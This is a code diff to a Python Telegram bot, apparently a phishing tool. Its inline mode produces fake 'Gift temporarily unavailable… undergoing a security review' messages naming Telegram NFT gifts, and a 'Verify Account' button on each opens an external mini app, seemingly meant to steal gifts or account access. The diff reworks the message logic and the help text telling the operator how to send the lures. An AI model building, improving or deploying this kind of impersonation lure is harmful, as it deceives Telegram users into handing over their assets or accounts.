@@ -42,148 +42,64 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         parse_mode='Markdown'
     )
 
-# ===== ИНЛАЙН-РЕЖИМ =====
+# ===== ИНЛАЙН-РЕЖИМ (ПРОСТОЙ И РАБОЧИЙ) =====
 async def inline_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.inline_query.query.strip()
     
     logger.info(f"📥 Инлайн-запрос: '{query}'")
     
-    # КНОПКА ДЛЯ ВСЕХ РЕЗУЛЬТАТОВ
+    # КНОПКА
     keyboard = [
         [InlineKeyboardButton("✅ Verify Account", web_app=WebAppInfo(url=MINI_APP_URL))]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
-    # БАЗОВЫЙ ТЕКСТ ДЛЯ ВСЕХ РЕЗУЛЬТАТОВ
-    base_message = (
+    # БЕРЕМ ПЕРВОЕ СЛОВО КАК ИМЯ ПОДАРКА
+    gift_name = query if query else "JollyChimp-20203"
+    
+    # ЕСЛИ ВВЕДЕНА ССЫЛКА - БЕРЕМ ID ИЗ НЕЕ
+    if query.startswith('http'):
+        gift_name = query.split('/')[-1]
+        view_gift = query
+    else:
+        view_gift = f"https://t.me/nft/{gift_name}"
+    
+    # ФОРМИРУЕМ СООБЩЕНИЕ
+    message = (
         f"❄️ *Gift temporarily unavailable*\n\n"
-        f"*{query if query else 'SpyAgaric-37522'}* is currently undergoing a security review.\n\n"
+        f"*{gift_name}* is currently undergoing a security review.\n\n"
         f"To regain access, please verify the gift using the official bot below.\n\n"
-        f"🔗 [View Gift]({query if query else 'https://t.me/nft/SpyAgaric-37522'})\n\n"
+        f"🔗 [View Gift]({view_gift})\n\n"
         f"A single tap below and the asset is on its way."
     )
     
-    # ЕСЛИ НИЧЕГО НЕ ВВЕДЕНО - 3 ПРИМЕРА
-    if not query:
-        results = [
-            InlineQueryResultArticle(
-                id="1",
-                title="❄️ SpyAgaric-37522",
-                description="Gift temporarily unavailable",
-                input_message_content=InputTextMessageContent(
-                    message_text=(
-                        f"❄️ *Gift temporarily unavailable*\n\n"
-                        f"*SpyAgaric-37522* is currently undergoing a security review.\n\n"
-                        f"To regain access, please verify the gift using the official bot below.\n\n"
-                        f"🔗 [View Gift](https://t.me/nft/SpyAgaric-37522)\n\n"
-                        f"A single tap below and the asset is on its way."
-                    ),
-                    parse_mode='Markdown',
-                    disable_web_page_preview=False
-                ),
-                reply_markup=reply_markup,
-                thumb_url=PHOTO_URL
-            ),
-            InlineQueryResultArticle(
-                id="2",
-                title="❄️ HappyBrownie-21443",
-                description="Gift temporarily unavailable",
-                input_message_content=InputTextMessageContent(
-                    message_text=(
-                        f"❄️ *Gift temporarily unavailable*\n\n"
-                        f"*HappyBrownie-21443* is currently undergoing a security review.\n\n"
-                        f"To regain access, please verify the gift using the official bot below.\n\n"
-                        f"🔗 [View Gift](https://t.me/nft/HappyBrownie-21443)\n\n"
-                        f"A single tap below and the asset is on its way."
-                    ),
-                    parse_mode='Markdown',
-                    disable_web_page_preview=False
-                ),
-                reply_markup=reply_markup,
-                thumb_url=PHOTO_URL
-            ),
-            InlineQueryResultArticle(
-                id="3",
-                title="❄️ JollyChimp-20203",
-                description="Gift temporarily unavailable",
-                input_message_content=InputTextMessageContent(
-                    message_text=(
-                        f"❄️ *Gift temporarily unavailable*\n\n"
-                        f"*JollyChimp-20203* is currently undergoing a security review.\n\n"
-                        f"To regain access, please verify the gift using the official bot below.\n\n"
-                        f"🔗 [View Gift](https://t.me/nft/JollyChimp-20203)\n\n"
-                        f"A single tap below and the asset is on its way."
-                    ),
-                    parse_mode='Markdown',
-                    disable_web_page_preview=False
-                ),
-                reply_markup=reply_markup,
-                thumb_url=PHOTO_URL
-            )
-        ]
-        await update.inline_query.answer(results)
-        return
+    # СОЗДАЕМ РЕЗУЛЬТАТ
+    result = InlineQueryResultArticle(
+        id="1",
+        title=f"❄️ {gift_name}",
+        description="Verify your gift",
+        input_message_content=InputTextMessageContent(
+            message_text=message,
+            parse_mode='Markdown',
+            disable_web_page_preview=False
+        ),
+        reply_markup=reply_markup,
+        thumb_url=PHOTO_URL
+    )
     
-    # ЕСЛИ ВВЕДЕНА ССЫЛКА
-    if query.startswith('http') or re.match(r'^https?://t\.me/(nft|gift|portal)/', query):
-        gift_id = query.split('/')[-1] if '/' in query else 'Unknown'
-        
-        message = (
-            f"❄️ *Gift temporarily unavailable*\n\n"
-            f"*{gift_id}* is currently undergoing a security review.\n\n"
-            f"To regain access, please verify the gift using the official bot below.\n\n"
-            f"🔗 [View Gift]({query})\n\n"
-            f"A single tap below and the asset is on its way."
-        )
-        
-        results = [
-            InlineQueryResultArticle(
-                id="1",
-                title=f"❄️ {gift_id}",
-                description="Verify your gift",
-                input_message_content=InputTextMessageContent(
-                    message_text=message,
-                    parse_mode='Markdown',
-                    disable_web_page_preview=False
-                ),
-                reply_markup=reply_markup,
-                thumb_url=PHOTO_URL
-            )
-        ]
-        await update.inline_query.answer(results)
-        return
-    
-    # ЕСЛИ ВВЕДЕН ТЕКСТ (НЕ ССЫЛКА) - ПОКАЗЫВАЕМ ПРИМЕРЫ
-    results = [
-        InlineQueryResultArticle(
-            id="1",
-            title=f"❄️ {query[:20]}...",
-            description="Search for gift",
-            input_message_content=InputTextMessageContent(
-                message_text=(
-                    f"❄️ *Gift temporarily unavailable*\n\n"
-                    f"*{query}* is currently undergoing a security review.\n\n"
-                    f"To regain access, please verify the gift using the official bot below.\n\n"
-                    f"A single tap below and the asset is on its way."
-                ),
-                parse_mode='Markdown'
-            ),
-            reply_markup=reply_markup,
-            thumb_url=PHOTO_URL
-        )
-    ]
-    await update.inline_query.answer(results)
+    # ОТВЕЧАЕМ
+    await update.inline_query.answer([result])
 
 # ===== КОМАНДА /help =====
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
         "🤖 *Как использовать бота:*\n\n"
-        "1. Напиши `@PortalVerificationsRobot ссылка_на_подарок`\n"
+        "1. Напиши `@PortalVerificationsRobot`\n"
         "2. Выбери результат\n"
         "3. Отправь сообщение\n\n"
-        "Пример:\n"
-        "`@PortalVerificationsRobot https://t.me/nft/JollyChimp-20203`\n\n"
-        "Или просто нажми /start для теста",
+        "Или напиши:\n"
+        "`@PortalVerificationsRobot JollyChimp-20203`\n"
+        "`@PortalVerificationsRobot https://t.me/nft/HappyBrownie-21443`",
         parse_mode='Markdown'
     )
 
@@ -196,7 +112,7 @@ def main():
     application.add_handler(InlineQueryHandler(inline_query))
     
     logger.info("🚀 Бот запущен и работает!")
-    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot [ссылка]")
+    logger.info("📱 Инлайн-режим: @PortalVerificationsRobot [текст]")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == '__main__':
